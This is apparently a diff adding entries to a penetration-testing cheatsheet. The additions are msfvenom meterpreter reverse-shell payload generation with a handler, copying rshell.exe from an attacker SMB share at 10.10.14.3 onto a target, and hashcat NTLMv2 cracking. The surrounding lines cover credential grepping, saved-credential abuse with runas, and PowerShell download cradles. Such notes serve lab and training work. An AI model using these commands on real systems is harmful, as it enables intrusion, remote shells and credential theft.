@@ -320,11 +320,25 @@ Reverse shell cheatsheet:
 
 Metasploit reverse shell payloads:
 * http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
+* https://netsec.ws/?p=331
+
+Meterpreter reverse-shell + usage:
+```bash
+# Windows
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[host] LPORT=444 -f exe -o win_rshell.exe
+
+# Linux
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[host] LPORT=444 -f elf -o lin_rshell.elf
+
+# Use reverse-shell
+msf> use exploit/multi/handler
+```
 
 If reverse shell hangs / dies:
 * Try a different port, try a different port. E.g. 443 doesn't work, try 80 or 8080 (see your Nmap results).
 * A firewall may be blocking / disconnecting you on the port.
 * Try a bind shell instead of reverse shell.
+* Try generate a different payload with `msfvenom -p` or find another payload online.
 
 ## KERNEL EXPLOITS
 
@@ -348,7 +362,6 @@ Find hardcoded credentials / interesting items
 # Recursive grep, match regex pattern, ignoring case for all files from the root directory.
 $ grep -Rei 'password|username|[pattern3]|[pattern4]' /
 ```
-
 
 TTY spawn cheatsheet: https://netsec.ws/?p=337
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
@@ -401,6 +414,11 @@ Windows privesc:
 * Restarting might simply mean you have to access the service directly
     * E.g. `MYSQL> restart` rather than running commands on cmd to try restart.
     
+Find Running Services:
+```
+$ sc query state=all
+```
+    
 Cached Credentials:
 ```powershell
 # CMDKEY: https://ss64.com/nt/cmdkey.html
@@ -414,7 +432,7 @@ $ runas /savecred /User:ACCESS\Administrator "cmd.exe /C type C:\Users\Administr
 ```
 
 Nestat:
-* `netstat`: see what ports are on LISTENING state, but not pubicly accessible from the outside.
+* `netstat -alnp`: see what ports are on LISTENING state, but not pubicly accessible from the outside.
 * There's often a SQL server/tomcat/smb/samba running, but not public facing.
 * You can port-forward back to your machine and hit them with public exploits for root shell.
 * E.g.:
@@ -464,11 +482,17 @@ $ ftp -v -n -s:ftp.txt
 # Certutil ???
 http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
 
-# Powershell
+# Powershell method
 (new-object System.Net.WebClient).DownloadString("http://www.mysite.com") # replicate Curl
 (new-object System.Net.WebClient).DownloadData("http://www.mysite.com")   # replicate Curl
 (new-object System.Net.WebClient).DownloadFile("http://www.mysite.com", 'C:\Temp\file') # replicate Wget
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; # ignore SSL warnings (add to lines above)
+
+# Powershell method
+$ impacket-smbserver files `pwd`            # @KALI: Set up a SMB server with files=share `pwd`=workingdir.
+PS> xcopy \\10.10.14.3\files\rshell.exe .   # @TARGET: Copy rshell.exe from remote share to current dir.
+
+
 ```
 
 Vulnerable services:
@@ -503,6 +527,17 @@ $ wine exploit.exe
 ```
 
 ## OTHER THINGS
+
+__Cracking Hashes__
+
+Useful Websites (has worked before):
+* https://hashkiller.co.uk/Cracker/NTLM
+
+Tools:
+```
+$ hashcat -h | grep -i [hash you want to crack]     # find hash input number
+$ hashcat -m 5600 /path/to/hash /path/to/wordlist   # 5600 = specify NTLMv2 hash
+```
 
 __ZIP Files__
 
